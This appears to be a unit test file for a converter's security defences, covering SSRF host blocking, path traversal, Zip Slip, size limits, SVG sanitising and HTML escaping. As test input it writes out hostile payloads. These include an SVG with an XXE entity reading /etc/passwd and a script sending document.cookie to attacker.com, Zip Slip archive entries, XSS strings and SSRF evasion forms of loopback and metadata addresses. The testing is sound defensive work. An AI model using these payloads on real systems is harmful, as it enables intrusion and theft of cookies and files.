// test/unit/security.test.js
import assert from 'node:assert';
import path from 'node:path';
import fs from 'node:fs';
import os from 'node:os';
import http from 'node:http';
import crypto from 'node:crypto';
import { fileURLToPath } from 'node:url';
import AdmZip from 'adm-zip';

import {
    isPathInsideBaseDir,
    isPrivateOrRestrictedHost,
    isRestrictedOrPrivateDomain,
    isValidImageMagicBytes,
    createFallbackImage,
    ImageRegistry
} from '../../src/parsers/images.js';
import { readFigFile } from '../../src/decompiler/reader.js';
import { convertHtmlToNodes } from '../../src/converter/index.js';
import { sanitizeSvg } from '../../src/parsers/svg.js';
import { escapeHtml, renderNodeToHtml } from '../../src/decompiler/html.js';

export default async function run(arg1, arg2) {
    const { it, itAsync } = (arg1 && arg1.it) ? arg1 : { it: arg1, itAsync: arg2 };

    it('verifies Path Traversal protection in ImageRegistry', () => {
        const baseDir = '/Users/test/project';

        assert.strictEqual(isPathInsideBaseDir('img/logo.png', baseDir), true);
        assert.strictEqual(isPathInsideBaseDir('/Users/test/project/assets/photo.jpg', baseDir), true);
        assert.strictEqual(isPathInsideBaseDir('../../etc/passwd', baseDir), false);
        assert.strictEqual(isPathInsideBaseDir('/etc/passwd', baseDir), false);
        assert.strictEqual(isPathInsideBaseDir('/Users/test/other-secret/.env', baseDir), false);
    });

    it('verifies SSRF and private/restricted host blocking', () => {
        // Loopback and internal names
        assert.strictEqual(isPrivateOrRestrictedHost('localhost'), true);
        assert.strictEqual(isPrivateOrRestrictedHost('sub.localhost'), true);
        assert.strictEqual(isPrivateOrRestrictedHost('service.local'), true);
        assert.strictEqual(isPrivateOrRestrictedHost('api.internal'), true);

        // IPv4 private & reserved
        assert.strictEqual(isPrivateOrRestrictedHost('127.0.0.1'), true);
        assert.strictEqual(isPrivateOrRestrictedHost('10.10.1.1'), true);
        assert.strictEqual(isPrivateOrRestrictedHost('172.16.5.4'), true);
        assert.strictEqual(isPrivateOrRestrictedHost('172.31.255.1'), true);
        assert.strictEqual(isPrivateOrRestrictedHost('192.168.0.1'), true);
        assert.strictEqual(isPrivateOrRestrictedHost('169.254.169.254'), true); // AWS metadata
        assert.strictEqual(isPrivateOrRestrictedHost('0.0.0.0'), true);
        assert.strictEqual(isPrivateOrRestrictedHost('255.255.255.255'), true);

        // Integer and hex IP evasions
        assert.strictEqual(isPrivateOrRestrictedHost('2130706433'), true); // 127.0.0.1 in decimal
        assert.strictEqual(isPrivateOrRestrictedHost('0x7f000001'), true); // 127.0.0.1 in hex

        // nip.io and sslip.io to private IPs
        assert.strictEqual(isPrivateOrRestrictedHost('127.0.0.1.nip.io'), true);
        assert.strictEqual(isPrivateOrRestrictedHost('10.0.0.1.nip.io'), true);
        assert.strictEqual(isPrivateOrRestrictedHost('192-168-1-1.sslip.io'), true);
        assert.strictEqual(isPrivateOrRestrictedHost('169.254.169.254.nip.io'), true);

        // IPv6 loopback & link-local
        assert.strictEqual(isPrivateOrRestrictedHost('::1'), true);
        assert.strictEqual(isPrivateOrRestrictedHost('fe80::1'), true);
        assert.strictEqual(isPrivateOrRestrictedHost('fc00::1'), true);

        // Public domains & IPs
        assert.strictEqual(isPrivateOrRestrictedHost('example.com'), false);
        assert.strictEqual(isPrivateOrRestrictedHost('github.com'), false);
        assert.strictEqual(isPrivateOrRestrictedHost('93.184.216.34'), false);
    });

    await itAsync('blocks private DNS domains and nip.io / sslip.io mapping to local/private IPs', async () => {
        const isRestricted1 = await isRestrictedOrPrivateDomain('127.0.0.1.nip.io');
        assert.strictEqual(isRestricted1, true);

        const isRestrictedLocal = await isRestrictedOrPrivateDomain('localhost');
        assert.strictEqual(isRestrictedLocal, true);

        const isRestrictedMetadata = await isRestrictedOrPrivateDomain('169.254.169.254');
        assert.strictEqual(isRestrictedMetadata, true);

        // Remote fetch check via ImageRegistry
        const registry = new ImageRegistry({ allowRemote: true, allowPrivateHosts: false });
        const res = await registry.resolveImage('http://127.0.0.1.nip.io/admin/credentials.json');
        const fallbackSha1 = crypto.createHash('sha1').update(createFallbackImage()).digest('hex');
        assert(res !== null);
        assert.strictEqual(res.sha1Hex, fallbackSha1);
    });

    await itAsync('blocks HTTP 301/302 redirects in remote image fetching', async () => {
        let requestCount = 0;
        const server = http.createServer((req, res) => {
            requestCount++;
            if (req.url === '/redirect') {
                res.writeHead(302, { Location: '/secret-destination' });
                res.end();
            } else {
                res.writeHead(200, { 'Content-Type': 'image/png' });
                res.end(createFallbackImage());
            }
        });

        await new Promise(resolve => server.listen(0, '127.0.0.1', resolve));
        const port = server.address().port;

        try {
            const registry = new ImageRegistry({
                allowRemote: true,
                allowPrivateHosts: true // Allow connect to mock server on loopback
            });

            const result = await registry.resolveImage(`http://127.0.0.1:${port}/redirect`);
            assert(result !== null);
            // With redirect: 'error', fetch rejects the 302 redirect and never queries /secret-destination
            assert.strictEqual(requestCount, 1);
            const fallbackSha1 = crypto.createHash('sha1').update(createFallbackImage()).digest('hex');
            assert.strictEqual(result.sha1Hex, fallbackSha1);
        } finally {
            await new Promise(resolve => server.close(resolve));
        }
    });

    it('sanitizes and blocks Zip Slip paths in decompiler reader.js', () => {
        const templatePath = path.resolve('templates/template.fig');
        assert(fs.existsSync(templatePath), 'template.fig must exist');
        const templateBuf = fs.readFileSync(templatePath);

        const zip = new AdmZip(templateBuf);

        // Inject malicious Zip Slip entries
        zip.addFile('images/../../malicious.sh', Buffer.from('#!/bin/sh\necho pwned\n'));
        zip.addFile('images/..%2F..%2Fevil.txt', Buffer.from('pwned\n'));
        zip.addFile('images/not-a-sha1-hash.png', Buffer.from('invalid\n'));
        zip.addFile('images/invalid/sub/hash.png', Buffer.from('invalid\n'));

        // Inject 1 valid SHA-1 hex entry
        const validSha1 = '0123456789abcdef0123456789abcdef01234567';
        zip.addFile(`images/${validSha1}`, createFallbackImage());

        const testArchive = zip.toBuffer();
        const figData = readFigFile(testArchive);

        // Verify valid SHA-1 image was extracted
        assert(figData.images.has(validSha1));

        // Verify no Zip Slip entries exist in extracted images map
        assert(!figData.images.has('../../malicious.sh'));
        assert(!figData.images.has('malicious.sh'));
        assert(!figData.images.has('..%2F..%2Fevil.txt'));
        assert(!figData.images.has('evil.txt'));
        assert(!figData.images.has('not-a-sha1-hash.png'));
        assert(!figData.images.has('hash.png'));

        // Only the 1 valid entry is accepted
        assert.strictEqual(figData.images.size, 1);
    });

    it('prevents Data Exfiltration by rejecting non-image buffers from allImages', () => {
        const registry = new ImageRegistry();
        const sensitiveSecret = JSON.stringify({
            aws_access_key: 'AKIAIOSFODNN7EXAMPLE',
            aws_secret_key: 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',
            db_pass: 'SuperSecretDatabasePassword123'
        });
        const sensitiveBuf = Buffer.from(sensitiveSecret, 'utf8');
        const sensitiveSha1 = crypto.createHash('sha1').update(sensitiveBuf).digest('hex');

        const registered = registry.registerBuffer(sensitiveBuf, 'credentials.json');

        const allImages = registry.getAllImages();

        // 1. Secret hash must NOT be in the images map
        assert.strictEqual(allImages.has(sensitiveSha1), false);

        // 2. Secret content must NOT be stored in any buffer in images
        for (const [hash, imgBuffer] of allImages.entries()) {
            assert.strictEqual(imgBuffer.includes('SuperSecretDatabasePassword123'), false);
            assert.strictEqual(imgBuffer.includes('AKIAIOSFODNN7EXAMPLE'), false);
        }

        // 3. Fallback transparent pixel image was registered instead
        const fallbackBuf = createFallbackImage();
        const fallbackSha1 = crypto.createHash('sha1').update(fallbackBuf).digest('hex');
        assert.strictEqual(registered.sha1Hex, fallbackSha1);
        assert(allImages.has(fallbackSha1));
    });

    it('blocks symlink breakout in isPathInsideBaseDir', () => {
        const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'html2fig-symlink-'));
        try {
            const projectDir = path.join(tmpDir, 'project');
            const secretDir = path.join(tmpDir, 'secret');
            fs.mkdirSync(projectDir, { recursive: true });
            fs.mkdirSync(secretDir, { recursive: true });

            const secretFile = path.join(secretDir, 'passwords.txt');
            fs.writeFileSync(secretFile, 'admin:supersecret');

            // Create symlink inside project pointing to secret directory outside
            const symlinkPath = path.join(projectDir, 'assets_link');
            fs.symlinkSync(secretDir, symlinkPath, 'dir');

            // Paths traversing through the symlink must be rejected
            const traversalPath = path.join(projectDir, 'assets_link', 'passwords.txt');
            assert.strictEqual(isPathInsideBaseDir(traversalPath, projectDir), false);
            assert.strictEqual(isPathInsideBaseDir('assets_link/passwords.txt', projectDir), false);

            // Regular file directly inside projectDir is allowed
            const safeFile = path.join(projectDir, 'logo.png');
            fs.writeFileSync(safeFile, createFallbackImage());
            assert.strictEqual(isPathInsideBaseDir(safeFile, projectDir), true);
            assert.strictEqual(isPathInsideBaseDir('logo.png', projectDir), true);
        } finally {
            fs.rmSync(tmpDir, { recursive: true, force: true });
        }
    });

    await itAsync('enforces streaming size limit (DoS memory bomb protection)', async () => {
        const server = http.createServer((req, res) => {
            // Advertise 20MB in Content-Length
            res.writeHead(200, {
                'Content-Type': 'image/png',
                'Content-Length': '20971520'
            });
            res.end(Buffer.alloc(100));
        });

        await new Promise(resolve => server.listen(0, '127.0.0.1', resolve));
        const port = server.address().port;

        try {
            const registry = new ImageRegistry({
                allowRemote: true,
                allowPrivateHosts: true,
                maxImageSize: 1024 * 1024 // 1MB limit
            });

            const result = await registry.resolveImage(`http://127.0.0.1:${port}/bomb.png`);
            const fallbackSha1 = crypto.createHash('sha1').update(createFallbackImage()).digest('hex');
            assert.strictEqual(result.sha1Hex, fallbackSha1);
        } finally {
            await new Promise(resolve => server.close(resolve));
        }
    });

    await itAsync('terminates chunked stream exceeding maxImageSize', async () => {
        const server = http.createServer((req, res) => {
            res.writeHead(200, { 'Content-Type': 'image/png' });
            // Send multiple chunks exceeding limit
            const chunk = Buffer.alloc(1024, 0x89);
            res.write(chunk);
            res.write(chunk);
            res.write(chunk);
            res.end();
        });

        await new Promise(resolve => server.listen(0, '127.0.0.1', resolve));
        const port = server.address().port;

        try {
            const registry = new ImageRegistry({
                allowRemote: true,
                allowPrivateHosts: true,
                maxImageSize: 1500 // 1.5 KB limit
            });

            const result = await registry.resolveImage(`http://127.0.0.1:${port}/chunked.png`);
            const fallbackSha1 = crypto.createHash('sha1').update(createFallbackImage()).digest('hex');
            assert.strictEqual(result.sha1Hex, fallbackSha1);
        } finally {
            await new Promise(resolve => server.close(resolve));
        }
    });

    it('validates image magic bytes signature and rejects arbitrary binary/text', () => {
        // PNG magic bytes
        const pngBuf = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x00]);
        assert.strictEqual(isValidImageMagicBytes(pngBuf), true);

        // JPEG magic bytes
        const jpegBuf = Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10]);
        assert.strictEqual(isValidImageMagicBytes(jpegBuf), true);

        // GIF magic bytes
        const gifBuf = Buffer.from('GIF89a...');
        assert.strictEqual(isValidImageMagicBytes(gifBuf), true);

        // WebP magic bytes
        const webpBuf = Buffer.from('RIFF\x00\x00\x00\x00WEBPVP8 ...');
        assert.strictEqual(isValidImageMagicBytes(webpBuf), true);

        // SVG
        const svgBuf = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><circle r="5"/></svg>');
        assert.strictEqual(isValidImageMagicBytes(svgBuf), true);

        // Non-images (text, JSON, HTML, binary)
        assert.strictEqual(isValidImageMagicBytes(Buffer.from('{"key":"value"}')), false);
        assert.strictEqual(isValidImageMagicBytes(Buffer.from('Hello world text')), false);
        assert.strictEqual(isValidImageMagicBytes(Buffer.from('<html><body>XSS</body></html>')), false);
        assert.strictEqual(isValidImageMagicBytes(Buffer.from([0x7f, 0x45, 0x4c, 0x46])), false); // ELF
    });

    await itAsync('enforces allowedDomains whitelist in ImageRegistry', async () => {
        const registry = new ImageRegistry({
            allowRemote: true,
            allowedDomains: ['images.unsplash.com', 'assets.mysite.com']
        });

        const fallbackSha1 = crypto.createHash('sha1').update(createFallbackImage()).digest('hex');

        // Blocked domain
        const blockedRes = await registry.resolveImage('https://evil-attacker.com/malicious.png');
        assert.strictEqual(blockedRes.sha1Hex, fallbackSha1);

        // Whitelisted domain config verification
        assert(registry.allowedDomains.includes('images.unsplash.com'));
        assert(registry.allowedDomains.includes('assets.mysite.com'));
    });

    await itAsync('enforces DOM recursion depth limit (max 64 levels) preventing Stack Overflow DoS', async () => {
        let deepHtml = '<span>Leaf Text</span>';
        for (let i = 0; i < 75; i++) {
            deepHtml = `<div>${deepHtml}</div>`;
        }

        // Should complete safely without "RangeError: Maximum call stack size exceeded"
        const result = await convertHtmlToNodes(deepHtml, { sessionID: 1, localID: 1 }, {
            allowRemoteImages: false
        });

        assert(result !== null);
        assert(Array.isArray(result.nodeChanges));
        assert(result.nodeChanges.length > 0);
    });

    it('sanitizes SVG against XXE, external entities, scripts, and foreignObject', () => {
        const maliciousSvg = `<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd" [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg width="100" height="100" xmlns="http://www.w3.org/2000/svg" onload="alert(1)">
  <script>fetch('http://attacker.com/steal?cookie=' + document.cookie);</script>
  <foreignObject width="100" height="100">
    <iframe src="http://attacker.com"></iframe>
  </foreignObject>
  <use href="http://evil.com/icon.svg#test" />
  <image xlink:href="file:///etc/shadow" width="50" height="50" />
  <circle cx="50" cy="50" r="40" fill="red" />
</svg>`;

        const cleaned = sanitizeSvg(maliciousSvg);

        assert(!cleaned.includes('<!DOCTYPE'));
        assert(!cleaned.includes('<!ENTITY'));
        assert(!cleaned.includes('<script'));
        assert(!cleaned.includes('onload='));
        assert(!cleaned.includes('<foreignObject'));
        assert(!cleaned.includes('http://evil.com'));
        assert(!cleaned.includes('file:///etc/shadow'));
        assert(cleaned.includes('<circle'));
        assert(cleaned.includes('fill="red"'));
    });

    it('escapes HTML special characters and prevents Stored XSS in decompiler', () => {
        // 1. escapeHtml basic tests
        assert.strictEqual(
            escapeHtml('<script>alert("XSS & fun")</script>'),
            '&lt;script&gt;alert(&quot;XSS &amp; fun&quot;)&lt;/script&gt;'
        );
        assert.strictEqual(
            escapeHtml("it's a 'quote'"),
            'it&#39;s a &#39;quote&#39;'
        );

        // 2. renderNodeToHtml with malicious layer text
        const textNode = {
            type: 'TEXT',
            name: '<img src=x onerror=alert(1)>',
            textData: {
                characters: '<script>alert(document.domain)</script>'
            }
        };
        const htmlOutput = renderNodeToHtml(textNode, null, new Map());
        assert(!htmlOutput.includes('<script>'));
        assert(htmlOutput.includes('&lt;script&gt;alert(document.domain)&lt;/script&gt;'));

        // 3. Input element type attribute injection test
        const inputNode = {
            type: 'RECTANGLE',
            name: 'Input[text" onfocus="alert(1)]',
            size: { x: 200, y: 40 }
        };
        const inputHtml = renderNodeToHtml(inputNode, null, new Map());
        assert(!inputHtml.includes('onfocus="alert(1)'));
        assert(inputHtml.includes('type="text"'));
    });
}

const isDirectRun = process.argv[1] && fileURLToPath(import.meta.url) === path.resolve(process.argv[1]);
if (isDirectRun) {
    let passed = 0, failed = 0;
    const itSync = (name, fn) => {
        try { fn(); console.log("  \x1b[32m✔\x1b[0m " + name); passed++; }
        catch (e) { failed++; console.error("  \x1b[31m✖\x1b[0m " + name + "\n    " + e.message); }
    };
    const itAsyncLocal = async (name, fn) => {
        try { await fn(); console.log("  \x1b[32m✔\x1b[0m " + name); passed++; }
        catch (e) { failed++; console.error("  \x1b[31m✖\x1b[0m " + name + "\n    " + (e.stack || e.message)); }
    };
    run(itSync, itAsyncLocal).then(() => {
        console.log("\nPassed: " + passed + ", Failed: " + failed);
        if (failed > 0) process.exit(1);
    }).catch(err => {
        console.error(err);
        process.exit(1);
    });
}
